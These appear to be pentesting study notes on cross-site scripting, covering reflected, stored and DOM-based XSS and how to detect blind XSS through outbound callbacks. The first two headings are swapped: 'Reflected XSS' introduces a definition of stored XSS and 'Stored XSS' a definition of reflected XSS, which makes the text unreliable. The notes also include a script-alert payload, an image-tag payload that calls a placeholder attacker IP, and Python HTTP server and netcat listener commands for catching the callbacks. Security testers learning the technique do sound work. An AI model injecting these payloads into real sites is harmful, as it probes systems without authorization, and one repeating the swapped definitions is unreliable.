# Fundamentals

### Reflected XSS

In a persistent XSS attack, the malicious script is stored on the target server (e.g., in a database, message forum, visitor log, or comment field) and is executed in the browser of any user who views the affected page.

### Stored XSS

Reflected XSS attacks occur when an attacker sends a malicious script as part of a request (e.g., in a URL or form submission) that is immediately echoed by the web server in the response and executed in the victim's browser.

```js
// Test reference
<script>alert(123)</script>
```


### DOM Based XSS

DOM based XSS attacks involve modifying the DOM environment in the victim's browser, often without any interaction with the server.

### Testing for outbound connections

```js
// Test reference
<img src="http://<OUR_IP>/<PARAMETER>"></img>
```

Where `<PARAMETER>` is replaced with an identifier for whatever input we are currently fuzzing in order to help identify which field turned out to be vulnerable in our request.

**Note:** We can also capture our request in burp to fuzz the `User-Agent` and `Referer` headers before sending it off.

Before sending we also need to setup a Python HTTP server

```bash
python3 -m http.server 80
```

This will allow us to capture multiple requests in the case multiple parameters are vulnerable and we need to receive multiple requests.

Once we have an individual request we want to enumerate, we can setup a netcat listener to view the headers associated with it.

```bash
nc -lvnp 80
```

If dealing with stored XSS, if no request is made but an error image is still generated, we can still attempt to proceed using filter bypass techniques.
